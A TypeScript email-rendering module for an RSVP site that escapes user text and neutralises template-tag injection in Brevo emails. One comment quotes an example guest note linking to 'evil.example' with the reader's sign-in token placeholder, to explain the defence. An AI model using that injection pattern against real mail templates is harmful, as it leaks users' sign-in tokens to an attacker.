/**
 * Building blocks for the HTML and text parts of every email. Inline styles
 * only, one column: this has to look right in whatever mail app a phone
 * happens to open.
 *
 * The site is After Dark -- plum night, lime and pink -- but the email body
 * stays light. Gmail and Outlook rewrite dark backgrounds in their own dark
 * modes and the result is unreadable, so the brand lives in the header band
 * and the buttons, and the text sits on white.
 */

import type { Rendered } from "./brevo";

export function escapeHtml(value: string): string {
	return value
		.replaceAll("&", "&amp;")
		.replaceAll("<", "&lt;")
		.replaceAll(">", "&gt;")
		.replaceAll('"', "&quot;")
		.replaceAll("'", "&#39;");
}

/**
 * Brevo replaces these in both bodies and headers when the request carries
 * `params` (or per-recipient `messageVersions[].params`). Only list emails
 * use them; never run escapeHtml over the output of this helper.
 */
export const PARAM = {
	unsubscribeUrl: "{{ params.unsubscribeUrl }}",
	/** The reader's sign-in token, in every link back to the site. */
	key: "{{ params.key }}",
} as const;

/**
 * What a person typed can't open a Brevo template tag. Brevo runs its
 * template language over the subject and both bodies, and fills
 * `{{ params.key }}` with each reader's sign-in token: a guest's note
 * reading "https://evil.example/?t={{ params.key }}" would hand the host
 * a link that gives their token away, and "{%" or "{#" can break or cut
 * off the email. Every brace in someone's words gets a zero-width space
 * after it, invisible to the reader and enough that no tag can start
 * there. email() applies this to everything except the links the
 * templates build, which are the only place a placeholder belongs.
 */
function defuse(value: string): string {
	return value.replaceAll("{", "{\u200b");
}

const PLACEHOLDER = /\{\{ params\.(?:unsubscribeUrl|key) \}\}/g;

/**
 * The mailer's backstop over the finished email: outside the placeholders
 * this package writes, no brace may start a tag, however many come in a
 * row. With defuse doing its job upstream this changes nothing.
 */
export function guardTemplateSyntax(value: string): string {
	const parts = value.split(PLACEHOLDER);
	const kept = value.match(PLACEHOLDER) ?? [];
	return parts
		.map((part, i) => part.replace(/\{(?=[{%#])/g, "{\u200b") + (kept[i] ?? ""))
		.join("");
}

const FONT =
	"font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;";

/** After Dark, as far as email allows. */
export const COLORS = {
	night: "#14101F",
	ink: "#1F1930",
	lime: "#C6FF3D",
	pink: "#FF4FA3",
	/** Pink deep enough to read as text on white. */
	pinkText: "#B0236C",
	muted: "#5E5577",
	line: "#E4DEF0",
	ground: "#F3F0F8",
} as const;

/** How the site names itself: sender name, kicker, wordmark text, running copy. */
export const SITE_LABEL = "Botch RSVP";

/**
 * Every colour a body can show, resolved once. The builders take one of
 * these and write the right colour the first time, so nothing has to find
 * and replace styles in finished HTML (which would also hit a colour a
 * guest typed into a note).
 */
type Palette = {
	ground: string;
	text: string;
	/** The header band when there is no card picture. */
	band: string;
	accent: string;
	onAccent: string;
	accent2: string;
	onAccent2: string;
	/** Links and the kicker, readable on white. */
	link: string;
	muted: string;
};

const AFTER_DARK: Palette = {
	ground: COLORS.ground,
	text: COLORS.ink,
	band: COLORS.night,
	accent: COLORS.lime,
	onAccent: COLORS.night,
	accent2: COLORS.pink,
	onAccent2: COLORS.night,
	link: COLORS.pinkText,
	muted: COLORS.muted,
};

const styles = {
	wrap: "max-width:560px; margin:0 auto; padding:24px 16px;",
	wordmark:
		"margin:0; font-size:18px; font-weight:900; letter-spacing:-0.02em; color:#F5F0FF;",
	cover: "display:block; width:100%; height:auto; border:0;",
	card: `background:#ffffff; padding:28px 24px; border-radius:0 0 20px 20px; border:1px solid ${COLORS.line}; border-top:0;`,
	h1: "margin:0 0 16px; font-size:28px; line-height:1.1; font-weight:900; letter-spacing:-0.03em;",
	p: "margin:0 0 14px; font-size:16px; line-height:1.5;",
	facts:
		"margin:0 0 18px; padding:0; border-collapse:collapse; font-size:16px; line-height:1.5;",
	factValue: "padding:4px 0; font-weight:600; vertical-align:baseline;",
	buttonRow: "margin:22px 0 8px;",
} as const;

const body = (p: Palette) =>
	`margin:0; padding:0; background:${p.ground}; ${FONT} color:${p.text};`;
const band = (color: string) =>
	`background:${color}; padding:18px 24px; border-radius:20px 20px 0 0;`;
const kicker = (p: Palette) =>
	`margin:0 0 8px; font-size:12px; letter-spacing:0.1em; text-transform:uppercase; font-weight:700; color:${p.link};`;
const factLabel = (p: Palette) =>
	`padding:4px 14px 4px 0; font-size:12px; letter-spacing:0.1em; text-transform:uppercase; font-weight:700; color:${p.muted}; vertical-align:baseline; white-space:nowrap;`;
const pill = (bg: string, fg: string) =>
	`display:inline-block; margin:0 6px 8px 0; padding:13px 22px; border-radius:999px; background:${bg}; color:${fg} !important; text-decoration:none; font-weight:800; font-size:15px;`;
const outline = (p: Palette) =>
	`display:inline-block; margin:0 6px 8px 0; padding:12px 21px; border-radius:999px; border:1px solid ${COLORS.ink}; color:${p.text} !important; text-decoration:none; font-weight:800; font-size:15px;`;
const mutedStyle = (p: Palette) =>
	`color:${p.muted}; font-size:14px; line-height:1.5;`;
const footerStyle = (p: Palette) =>
	`margin:16px 0 0; padding:0 4px; color:${p.muted}; font-size:12px; line-height:1.5;`;

export type Fact = { label: string; value: string };

/**
 * An event's own design, as far as email can carry it. The card itself is
 * a picture (mail clients can't be trusted with fonts or positioning);
 * around it, the design's colours replace After Dark's. The body stays
 * light for the same reason it always has. Every value here is a plain
 * hex colour or a font stack from the design registry.
 */
export type EmailLook = {
	/** The card drawn as an image, absolute and token-free. */
	cardUrl: string | null;
	/** What the card says, for mail that blocks images. */
	cardAlt: string;
	band: string;
	ground: string;
	text: string;
	accent: string;
	onAccent: string;
	accent2: string;
	onAccent2: string;
	/** Links and the kicker: the second accent, made readable on white. */
	link: string;
	headingStack: string;
};

/** After Dark, or the event's own colours when it has a design on. */
function paletteOf(look?: EmailLook | null): Palette {
	if (!look) return AFTER_DARK;
	return {
		ground: look.ground,
		text: look.text,
		band: look.band,
		accent: look.accent,
		onAccent: look.onAccent,
		accent2: look.accent2,
		onAccent2: look.onAccent2,
		link: look.link,
		muted: COLORS.muted,
	};
}

/** An escaped paragraph of plain text. */
function para(text: string): string {
	return paraHtml(escapeHtml(text));
}

/** A paragraph of HTML the caller has already made safe. */
export function paraHtml(html: string): string {
	return `<p style="${styles.p}">${html}</p>`;
}

/** Escaped paragraphs from a block of plain text (blank line = new paragraph). */
function paragraphs(text: string): string {
	return text
		.split(/\n{2,}/)
		.map((block) => block.trim())
		.filter(Boolean)
		.map((block) => para(block).replaceAll("\n", "<br>"))
		.join("\n");
}

/** A small label/value table, escaped. */
function factsTable(facts: Fact[], pal: Palette = AFTER_DARK): string {
	const rows = facts
		.map(
			(f) =>
				`<tr><td style="${factLabel(pal)}">${escapeHtml(f.label)}</td><td style="${styles.factValue}">${escapeHtml(f.value)}</td></tr>`,
		)
		.join("");
	return `<table role="presentation" style="${styles.facts}">${rows}</table>`;
}

type ButtonTone = "lime" | "pink" | "outline";

function buttonLink(
	label: string,
	href: string,
	tone: ButtonTone,
	pal: Palette,
): string {
	const style =
		tone === "pink"
			? pill(pal.accent2, pal.onAccent2)
			: tone === "outline"
				? outline(pal)
				: pill(pal.accent, pal.onAccent);
	return `<a href="${escapeHtml(href)}" style="${style}">${escapeHtml(label)}</a>`;
}

/** Several buttons on one line, wrapping on a phone. */
function buttons(
	items: { label: string; href: string; tone?: ButtonTone }[],
	pal: Palette = AFTER_DARK,
): string {
	return `<p style="${styles.buttonRow}">${items
		.map((b) => buttonLink(b.label, b.href, b.tone ?? "lime", pal))
		.join(" ")}</p>`;
}

export function muted(html: string, pal: Palette = AFTER_DARK): string {
	return `<p style="${styles.p} ${mutedStyle(pal)}">${html}</p>`;
}

/**
 * The fallback under a button for clients that mangle it. Concrete URL,
 * so it is escaped here; the link is meant for one reader.
 */
function pasteLink(url: string, pal: Palette = AFTER_DARK): string {
	return muted(
		`Or paste this into a browser:<br><a href="${escapeHtml(url)}" style="color:${pal.link}; word-break:break-all;">${escapeHtml(url)}</a>`,
		pal,
	);
}

/**
 * Footer for list emails: why they got it, and the way out. The link opens a
 * page with a button rather than acting on the GET, because mail clients
 * fetch links unprompted. Uses raw placeholders.
 */
function listFooter(pal: Palette = AFTER_DARK): string {
	return `<p style="${footerStyle(pal)}">You got this because you're on ${escapeHtml(SITE_LABEL)}. Links in this email sign you in, so don't forward it. Rather not get these? <a href="${PARAM.unsubscribeUrl}" style="color:${pal.link};">Unsubscribe</a>.</p>`;
}

function listFooterText(): string {
	return `You got this because you're on ${SITE_LABEL}.\nLinks in this email sign you in, so don't forward it.\nRather not get these? Unsubscribe: ${PARAM.unsubscribeUrl}`;
}

export function layout(input: {
	title: string;
	kicker?: string;
	heading: string;
	bodyHtml: string;
	footerHtml?: string;
	/** An absolute, token-free image URL shown full width under the band. */
	coverUrl?: string | null;
	/** The event's design, which replaces the band and the cover. */
	look?: EmailLook | null;
}): string {
	const look = input.look ?? null;
	const pal = paletteOf(look);
	// With a design the card is the header: no wordmark band, no cover.
	// Without a card image yet, a band in the design's own colour stands in.
	let top: string;
	if (look) {
		top = look.cardUrl
			? `<img src="${escapeHtml(look.cardUrl)}" alt="${escapeHtml(look.cardAlt)}" width="560" style="${styles.cover} border-radius:20px 20px 0 0;">`
			: `<div style="${band(pal.band)}"><p style="${styles.wordmark}">${escapeHtml(look.cardAlt)}</p></div>`;
	} else {
		const cover = input.coverUrl
			? `\n<img src="${escapeHtml(input.coverUrl)}" alt="" width="560" style="${styles.cover}">`
			: "";
		top = `<div style="${band(pal.band)}"><p style="${styles.wordmark}">botch<span style="color:${pal.accent};">&bull;</span>rsvp</p></div>${cover}`;
	}
	const headingFont = look
		? ` font-family:${look.headingStack.replaceAll('"', "'")};`
		: "";
	return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="color-scheme" content="light">
<title>${escapeHtml(input.title)}</title>
</head>
<body style="${body(pal)}">
<div style="${styles.wrap}">
${top}
<div style="${styles.card}">
<p style="${kicker(pal)}">${escapeHtml(input.kicker ?? SITE_LABEL)}</p>
<h1 style="${styles.h1}${headingFont}">${escapeHtml(input.heading)}</h1>
${input.bodyHtml}
</div>
${input.footerHtml ?? ""}
</div>
</body>
</html>`;
}

/**
 * One piece of an email body, written once and drawn twice: as HTML for
 * mail apps and as the plain-text part beside it. Templates list blocks
 * instead of keeping an HTML array and a text array in step by hand,
 * where a line added to one was easily missed in the other.
 */
export type Block =
	/** A paragraph of plain text. */
	| { kind: "text"; text: string }
	/** Something a person typed: blank lines start new paragraphs. */
	| { kind: "typed"; text: string }
	/** A small label/value table; text lines read "Label: value". */
	| { kind: "facts"; facts: Fact[] }
	/** Buttons on one line; text lines read "Label: link". */
	| {
			kind: "buttons";
			items: { label: string; href: string; tone?: ButtonTone }[];
	  }
	/** The "or paste this" fallback under a button. Text has the button line. */
	| { kind: "pasteLink"; url: string }
	/** A quieter paragraph of plain text. */
	| { kind: "muted"; text: string }
	/** A template's own piece, with HTML it has already made safe. */
	| { kind: "custom"; html: string; text: string };

/** A block with every word defused and every link left as built. */
function defused(block: Block): Block {
	switch (block.kind) {
		case "text":
		case "typed":
		case "muted":
			return { ...block, text: defuse(block.text) };
		case "facts":
			return {
				...block,
				facts: block.facts.map((f) => ({
					label: defuse(f.label),
					value: defuse(f.value),
				})),
			};
		case "buttons":
			return {
				...block,
				items: block.items.map((b) => ({ ...b, label: defuse(b.label) })),
			};
		case "pasteLink":
			return block;
		case "custom":
			return { ...block, html: defuse(block.html), text: defuse(block.text) };
	}
}

function blockHtml(block: Block, pal: Palette): string {
	switch (block.kind) {
		case "text":
			return para(block.text);
		case "typed":
			return paragraphs(block.text);
		case "facts":
			return block.facts.length > 0 ? factsTable(block.facts, pal) : "";
		case "buttons":
			return buttons(block.items, pal);
		case "pasteLink":
			return pasteLink(block.url, pal);
		case "muted":
			return muted(escapeHtml(block.text), pal);
		case "custom":
			return block.html;
	}
}

function blockText(block: Block): string {
	switch (block.kind) {
		case "text":
		case "muted":
			return block.text;
		case "typed":
			return block.text.trim();
		case "facts":
			return block.facts.map((f) => `${f.label}: ${f.value}`).join("\n");
		case "buttons":
			return block.items.map((b) => `${b.label}: ${b.href}`).join("\n");
		case "pasteLink":
			return "";
		case "custom":
			return block.text;
	}
}

/**
 * A subject as one line of plain text: a person typed the title or the
 * host's own subject, and a line break or control character has no business
 * in a header, a notification or a log line. Lengths are the caller's.
 */
export function cleanSubject(subject: string): string {
	return subject
		.replace(/[\p{Cc}\u2028\u2029]+/gu, " ")
		.replace(/ {2,}/g, " ")
		.trim();
}

/** `j***@example.com`: enough to tell a log line's subject, not to mail them. */
export function redactEmail(address: string): string {
	const at = address.lastIndexOf("@");
	if (at < 1) return "***";
	return `${address.slice(0, 1)}***${address.slice(at)}`;
}

/** Redact every address in a string, for logging text a vendor sent back. */
export function scrubEmails(text: string): string {
	return text.replace(/[^\s<>"',;:()]+@[^\s<>"',;:()]+/g, redactEmail);
}

/**
 * A whole email from its blocks. The text part opens with the heading, as
 * the HTML does, and puts a blank line between blocks. `list` adds the
 * unsubscribe footer every list email carries.
 */
export function email(input: {
	subject: string;
	kicker?: string;
	heading: string;
	blocks: Block[];
	list?: boolean;
	coverUrl?: string | null;
	look?: EmailLook | null;
}): Rendered {
	const pal = paletteOf(input.look);
	const subject = defuse(cleanSubject(input.subject));
	const heading = defuse(input.heading);
	const kicker = input.kicker === undefined ? undefined : defuse(input.kicker);
	const blocks = input.blocks.map(defused);
	// The card's alt text is the event's title.
	const look = input.look
		? { ...input.look, cardAlt: defuse(input.look.cardAlt) }
		: input.look;
	const html = layout({
		title: subject,
		kicker,
		heading,
		coverUrl: input.coverUrl,
		look,
		bodyHtml: blocks
			.map((b) => blockHtml(b, pal))
			.filter(Boolean)
			.join("\n"),
		footerHtml: input.list ? listFooter(pal) : undefined,
	});
	const text = [
		heading,
		...blocks.map(blockText),
		input.list ? listFooterText() : "",
	]
		.filter(Boolean)
		.join("\n\n");
	return { subject, html, text };
}
